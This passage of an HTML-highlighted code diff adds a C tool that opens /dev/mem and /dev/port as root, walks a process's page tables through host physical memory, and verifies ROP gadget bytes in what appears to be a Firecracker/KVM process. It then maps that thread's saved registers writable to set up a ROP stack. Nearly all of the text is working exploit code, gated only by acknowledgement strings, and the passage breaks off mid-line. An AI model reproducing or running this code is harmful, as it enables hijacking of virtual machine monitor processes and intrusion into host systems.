+<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> write_prefix[] = {
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x48</span>,
+    <span class="hljs-number">0x89</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x00</span>
+};
+
+<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> ioctl_continuation[] = {
+    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xff</span>,
+    <span class="hljs-number">0xff</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xc3</span>
+};
+
+<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> zero_eax_ret[] = {<span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xc3</span>};
+
+<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> signal_number)</span>
+{
+    _exit(<span class="hljs-number">128</span> + signal_number);
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">valid_run_id</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *value)</span>
+{
+    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(value);
+    <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">14</span> || length &gt; <span class="hljs-number">64</span> ||
+        <span class="hljs-built_in">strncmp</span>(value, <span class="hljs-string">"eventpath-v23-"</span>, <span class="hljs-number">14</span>) != <span class="hljs-number">0</span>) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    }
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> index = <span class="hljs-number">0</span>; index &lt; length; index++) {
+        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> byte = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)value[index];
+        <span class="hljs-keyword">if</span> (!((byte &gt;= <span class="hljs-string">'a'</span> &amp;&amp; byte &lt;= <span class="hljs-string">'z'</span>) ||
+              (byte &gt;= <span class="hljs-string">'0'</span> &amp;&amp; byte &lt;= <span class="hljs-string">'9'</span>) || byte == <span class="hljs-string">'-'</span>)) {
+            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        }
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title function_">parse_address</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *text, <span class="hljs-type">int</span> page_aligned)</span>
+{
+    <span class="hljs-type">char</span> *end = <span class="hljs-literal">NULL</span>;
+    <span class="hljs-type">uint64_t</span> value;
+    <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">NULL</span> || <span class="hljs-built_in">strncmp</span>(text, <span class="hljs-string">"0x"</span>, <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"hex address required\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">64</span>);
+    }
+    errno = <span class="hljs-number">0</span>;
+    value = strtoull(text + <span class="hljs-number">2</span>, &amp;end, <span class="hljs-number">16</span>);
+    <span class="hljs-keyword">if</span> (errno != <span class="hljs-number">0</span> || end == text + <span class="hljs-number">2</span> || *end != <span class="hljs-string">'\0'</span> || value == <span class="hljs-number">0</span> ||
+        (page_aligned &amp;&amp; (value &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>)) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"invalid address\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">64</span>);
+    }
+    <span class="hljs-keyword">return</span> value;
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title function_">alias_entry_for_hpa_gib</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> hpa_gib)</span>
+{
+    <span class="hljs-keyword">return</span> hpa_gib == MARKER_CONFLICT_HPA_GIB ?
+           MARKER_REMAP_ENTRY : hpa_gib;
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title function_">alias_gpa_for_hpa</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> hpa)</span>
+{
+    <span class="hljs-type">uint64_t</span> hpa_gib = hpa &gt;&gt; <span class="hljs-number">30</span>;
+    <span class="hljs-keyword">if</span> (hpa_gib &lt; FIRST_HPA_GIB || hpa_gib &gt; LAST_HPA_GIB) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"host physical address outside mapped window\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+    }
+    <span class="hljs-keyword">return</span> L4_ALIAS_BASE |
+           (alias_entry_for_hpa_gib(hpa_gib) &lt;&lt; <span class="hljs-number">30</span>) |
+           (hpa &amp; (HUGE_1G_U64 - <span class="hljs-number">1</span>));
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *<span class="hljs-title function_">map_host_page</span><span class="hljs-params">(<span class="hljs-type">int</span> descriptor, <span class="hljs-type">uint64_t</span> page_hpa, <span class="hljs-type">int</span> prot)</span>
+{
+    <span class="hljs-type">uint8_t</span> *mapping;
+    <span class="hljs-keyword">if</span> ((page_hpa &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unaligned host page\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+    }
+    mapping = mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE_U64, prot, MAP_SHARED, descriptor,
+                   (<span class="hljs-type">off_t</span>)alias_gpa_for_hpa(page_hpa));
+    <span class="hljs-keyword">if</span> (mapping == MAP_FAILED) {
+        perror(<span class="hljs-string">"mmap host page"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+    }
+    <span class="hljs-keyword">return</span> mapping;
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title function_">read_u64_hpa</span><span class="hljs-params">(<span class="hljs-type">int</span> descriptor, <span class="hljs-type">uint64_t</span> hpa)</span>
+{
+    <span class="hljs-type">uint8_t</span> *mapping;
+    <span class="hljs-type">uint64_t</span> value;
+    <span class="hljs-type">uint64_t</span> page_hpa = hpa &amp; ~(PAGE_SIZE_U64 - <span class="hljs-number">1</span>);
+    <span class="hljs-type">uint64_t</span> offset = hpa &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span> (offset &gt; PAGE_SIZE_U64 - <span class="hljs-keyword">sizeof</span>(value)) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"cross-page host read rejected\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+    }
+    mapping = map_host_page(descriptor, page_hpa, PROT_READ);
+    <span class="hljs-built_in">memcpy</span>(&amp;value, mapping + offset, <span class="hljs-keyword">sizeof</span>(value));
+    <span class="hljs-keyword">if</span> (munmap(mapping, PAGE_SIZE_U64) != <span class="hljs-number">0</span>) {
+        perror(<span class="hljs-string">"munmap host read"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+    }
+    <span class="hljs-keyword">return</span> value;
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">native_user_entry</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span>
+{
+    <span class="hljs-keyword">return</span> (value &amp; (PTE_PRESENT | PTE_USER)) ==
+           (PTE_PRESENT | PTE_USER);
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">native_protnone_leaf</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span>
+{
+    <span class="hljs-keyword">return</span> !(value &amp; PTE_PRESENT) &amp;&amp; (value &amp; PTE_PROTNONE) &amp;&amp;
+           !(value &amp; PTE_LARGE);
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title function_">walk_native</span><span class="hljs-params">(<span class="hljs-type">int</span> descriptor, <span class="hljs-type">uint64_t</span> pgd_hpa,
+                            <span class="hljs-type">uint64_t</span> virtual_address)</span>
+{
+    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> shifts[<span class="hljs-number">4</span>] = {<span class="hljs-number">39</span>, <span class="hljs-number">30</span>, <span class="hljs-number">21</span>, <span class="hljs-number">12</span>};
+    <span class="hljs-type">uint64_t</span> table = pgd_hpa;
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> level = <span class="hljs-number">0</span>; level &lt; <span class="hljs-number">4</span>; level++) {
+        <span class="hljs-type">uint64_t</span> index = (virtual_address &gt;&gt; shifts[level]) &amp; UINT64_C(<span class="hljs-number">0x1ff</span>);
+        <span class="hljs-type">uint64_t</span> entry = read_u64_hpa(
+            descriptor, table + index * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));
+        <span class="hljs-keyword">if</span> (level == <span class="hljs-number">3</span> &amp;&amp; native_protnone_leaf(entry)) {
+            <span class="hljs-keyword">return</span> ((~entry) &amp; ADDRESS_MASK_4K) +
+                   (virtual_address &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>));
+        }
+        <span class="hljs-keyword">if</span> (!native_user_entry(entry)) {
+            <span class="hljs-keyword">return</span> UINT64_MAX;
+        }
+        <span class="hljs-keyword">if</span> (level == <span class="hljs-number">1</span> &amp;&amp; (entry &amp; PTE_LARGE)) {
+            <span class="hljs-keyword">return</span> (entry &amp; ADDRESS_MASK_1G) +
+                   (virtual_address &amp; (HUGE_1G_U64 - <span class="hljs-number">1</span>));
+        }
+        <span class="hljs-keyword">if</span> (level == <span class="hljs-number">2</span> &amp;&amp; (entry &amp; PTE_LARGE)) {
+            <span class="hljs-keyword">return</span> (entry &amp; ADDRESS_MASK_2M) +
+                   (virtual_address &amp; (HUGE_2M_U64 - <span class="hljs-number">1</span>));
+        }
+        table = entry &amp; ADDRESS_MASK_4K;
+    }
+    <span class="hljs-keyword">return</span> table + (virtual_address &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>));
+}
+
+<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read_process_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> descriptor, <span class="hljs-type">uint64_t</span> pgd_hpa,
+                              <span class="hljs-type">uint64_t</span> virtual_address, <span class="hljs-type">uint8_t</span> *output,
+                              <span class="hljs-type">size_t</span> length)</span>
+{
+    <span class="hljs-type">size_t</span> copied = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">while</span> (copied &lt; length) {
+        <span class="hljs-type">uint64_t</span> address = virtual_address + copied;
+        <span class="hljs-type">uint64_t</span> hpa = walk_native(descriptor, pgd_hpa, address);
+        <span class="hljs-type">uint64_t</span> offset;
+        <span class="hljs-type">size_t</span> chunk;
+        <span class="hljs-type">uint8_t</span> *mapping;
+        <span class="hljs-keyword">if</span> (hpa == UINT64_MAX) {
+            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        }
+        offset = hpa &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>);
+        chunk = PAGE_SIZE_U64 - offset;
+        <span class="hljs-keyword">if</span> (chunk &gt; length - copied) {
+            chunk = length - copied;
+        }
+        mapping = map_host_page(descriptor, hpa &amp; ADDRESS_MASK_4K,
+                                PROT_READ);
+        <span class="hljs-built_in">memcpy</span>(output + copied, mapping + offset, chunk);
+        <span class="hljs-keyword">if</span> (munmap(mapping, PAGE_SIZE_U64) != <span class="hljs-number">0</span>) {
+            perror(<span class="hljs-string">"munmap process read"</span>);
+            <span class="hljs-built_in">exit</span>(<span class="hljs-number">70</span>);
+        }
+        copied += chunk;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>
+{
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ack = getenv(<span class="hljs-string">"NET08_V23_PRIVATE_STACK_MARKER_ACK"</span>);
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode = getenv(<span class="hljs-string">"NET08_V23_PRIVATE_STACK_MARKER_MODE"</span>);
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *run_id;
+    <span class="hljs-type">uint64_t</span> pgd_hpa;
+    <span class="hljs-type">uint64_t</span> load_bias;
+    <span class="hljs-type">uint64_t</span> ptregs_hpa;
+    <span class="hljs-type">uint64_t</span> ptregs_page_hpa;
+    <span class="hljs-type">uint64_t</span> ptregs_offset;
+    <span class="hljs-type">uint64_t</span> regs[PTREG_WORDS];
+    <span class="hljs-type">uint64_t</span> user_sp;
+    <span class="hljs-type">uint64_t</span> marker_va;
+    <span class="hljs-type">uint64_t</span> rop_stack_va;
+    <span class="hljs-type">uint64_t</span> ioctl_return_slot_va;
+    <span class="hljs-type">uint64_t</span> marker_hpa;
+    <span class="hljs-type">uint64_t</span> rop_stack_hpa;
+    <span class="hljs-type">uint64_t</span> ioctl_return_slot_hpa;
+    <span class="hljs-type">uint64_t</span> original_marker;
+    <span class="hljs-type">uint64_t</span> original_rop_first;
+    <span class="hljs-type">uint64_t</span> original_rop_second;
+    <span class="hljs-type">uint64_t</span> caller_return;
+    <span class="hljs-type">uint64_t</span> marker_word;
+    <span class="hljs-type">uint64_t</span> ioctl_return_va;
+    <span class="hljs-type">uint64_t</span> write_va;
+    <span class="hljs-type">uint64_t</span> zero_eax_ret_va;
+    <span class="hljs-type">uint8_t</span> observed[<span class="hljs-keyword">sizeof</span>(write_prefix) &gt; <span class="hljs-keyword">sizeof</span>(ioctl_continuation) ?
+                     <span class="hljs-keyword">sizeof</span>(write_prefix) : <span class="hljs-keyword">sizeof</span>(ioctl_continuation)];
+    <span class="hljs-type">uint8_t</span> *ptregs_page;
+    <span class="hljs-type">uint8_t</span> *stack_page;
+    <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint64_t</span> *live_regs;
+    <span class="hljs-type">int</span> memory_fd;
+    <span class="hljs-type">int</span> port_fd;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>;</span>
+    <span class="hljs-type">ssize_t</span> trigger_result;
+
+    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">5</span> || !valid_run_id(argv[<span class="hljs-number">1</span>])) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,
+                <span class="hljs-string">"usage: marker eventpath-v23-* pgd-hpa load-bias ptregs-hpa\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;
+    }
+    run_id = argv[<span class="hljs-number">1</span>];
+    <span class="hljs-keyword">if</span> (geteuid() != <span class="hljs-number">0</span> || mode == <span class="hljs-literal">NULL</span> || ack == <span class="hljs-literal">NULL</span> ||
+        !((<span class="hljs-built_in">strcmp</span>(mode, <span class="hljs-string">"dry-run"</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(ack,
+             <span class="hljs-string">"OWNED_FIRECRACKER_PRIVATE_STACK_MARKER_READ_ONLY_DRY_RUN"</span>) == <span class="hljs-number">0</span>) ||
+          (<span class="hljs-built_in">strcmp</span>(mode, <span class="hljs-string">"active"</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(ack,
+             <span class="hljs-string">"OWNED_FIRECRACKER_PRIVATE_STACK_MARKER_ONLY"</span>) == <span class="hljs-number">0</span>))) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"exact owned private-stack marker mode and acknowledgement required\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;
+    }
+    pgd_hpa = parse_address(argv[<span class="hljs-number">2</span>], <span class="hljs-number">1</span>);
+    load_bias = parse_address(argv[<span class="hljs-number">3</span>], <span class="hljs-number">1</span>);
+    ptregs_hpa = parse_address(argv[<span class="hljs-number">4</span>], <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (pgd_hpa &lt; FIRST_HPA_GIB * HUGE_1G_U64 ||
+        pgd_hpa &gt;= (LAST_HPA_GIB + <span class="hljs-number">1</span>) * HUGE_1G_U64 ||
+        ptregs_hpa &lt; FIRST_HPA_GIB * HUGE_1G_U64 ||
+        ptregs_hpa &gt;= (LAST_HPA_GIB + <span class="hljs-number">1</span>) * HUGE_1G_U64 ||
+        load_bias &gt;= (UINT64_C(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">47</span>)) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"address outside owned geometry\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;
+    }
+    ptregs_page_hpa = ptregs_hpa &amp; ADDRESS_MASK_4K;
+    ptregs_offset = ptregs_hpa &amp; (PAGE_SIZE_U64 - <span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span> (ptregs_offset &gt; PAGE_SIZE_U64 - <span class="hljs-keyword">sizeof</span>(regs)) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"pt_regs crosses host page\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">64</span>;
+    }
+
+    <span class="hljs-built_in">memset</span>(&amp;action, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(action));
+    action.sa_handler = fault_handler;
+    sigemptyset(&amp;action.sa_mask);
+    <span class="hljs-keyword">if</span> (sigaction(SIGBUS, &amp;action, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span> ||
+        sigaction(SIGSEGV, &amp;action, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) {
+        perror(<span class="hljs-string">"sigaction"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+    memory_fd = open(<span class="hljs-string">"/dev/mem"</span>, O_RDWR | O_SYNC | O_CLOEXEC);
+    <span class="hljs-keyword">if</span> (memory_fd &lt; <span class="hljs-number">0</span>) {
+        perror(<span class="hljs-string">"open /dev/mem"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+    port_fd = open(<span class="hljs-string">"/dev/port"</span>, O_WRONLY | O_CLOEXEC);
+    <span class="hljs-keyword">if</span> (port_fd &lt; <span class="hljs-number">0</span>) {
+        perror(<span class="hljs-string">"open /dev/port"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+
+    ioctl_return_va = load_bias + IOCTL_RETURN_VADDR;
+    write_va = load_bias + WRITE_VADDR;
+    zero_eax_ret_va = load_bias + ZERO_EAX_RET_VADDR;
+    <span class="hljs-keyword">if</span> (!read_process_bytes(memory_fd, pgd_hpa, write_va, observed,
+                            <span class="hljs-keyword">sizeof</span>(write_prefix)) ||
+        <span class="hljs-built_in">memcmp</span>(observed, write_prefix, <span class="hljs-keyword">sizeof</span>(write_prefix)) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"write wrapper prefix mismatch\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+    <span class="hljs-keyword">if</span> (!read_process_bytes(memory_fd, pgd_hpa, ioctl_return_va, observed,
+                            <span class="hljs-keyword">sizeof</span>(ioctl_continuation)) ||
+        <span class="hljs-built_in">memcmp</span>(observed, ioctl_continuation,
+               <span class="hljs-keyword">sizeof</span>(ioctl_continuation)) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"ioctl continuation mismatch\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+    <span class="hljs-keyword">if</span> (!read_process_bytes(memory_fd, pgd_hpa, zero_eax_ret_va, observed,
+                            <span class="hljs-keyword">sizeof</span>(zero_eax_ret)) ||
+        <span class="hljs-built_in">memcmp</span>(observed, zero_eax_ret, <span class="hljs-keyword">sizeof</span>(zero_eax_ret)) != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"zero-eax return gadget mismatch\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span>;
+    }
+
+    ptregs_page = map_host_page(memory_fd, ptregs_page_hpa,
+                                PROT_READ | PROT_WRITE);
+    <span class="hljs-built_in">memcpy</span>(regs, ptregs_page + ptregs_offset, <span class="hljs-keyword">sizeof</span>(regs));
+    live_regs = (<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint64_t</span> *)(ptregs_page + ptregs_offset);
+    <span class="hljs-keyword">if</span> (regs[<span class="hljs-number">10</span>] != SYSCALL_AX_IN_PROGRESS || regs[<span class="hljs-number">12</span>] != <span class="hljs-number">0</span> ||
+        regs[<span class="hljs-number">13</span>] != KVM_RUN_REQUEST || regs[<span class="hljs-number">14</span>] &lt; <span class="hljs-number">3</span> || regs[<span class="hljs-number">14</span>] &gt; <span class="hljs-number">4096</span> ||
+        regs[<span class="hljs-number">15</span>] != SYS_IOCTL || regs[<span class="hljs-number">16</span>] != ioctl_return_va ||
+        regs[<span class="hljs-number">17</span>] != USER_CS || !(regs[<span class="hljs-number">18</span>] &amp; UINT64_C(<span class="hljs-number">2</span>)) ||
+        regs[<span class="hljs-number">19</span>] &lt; UINT64_C(<span class="hljs-number">0x1000</span>) || regs[<span class="hljs-number">19</span>] &gt;= (UINT64_C(<span class="hljs-number">1</spa
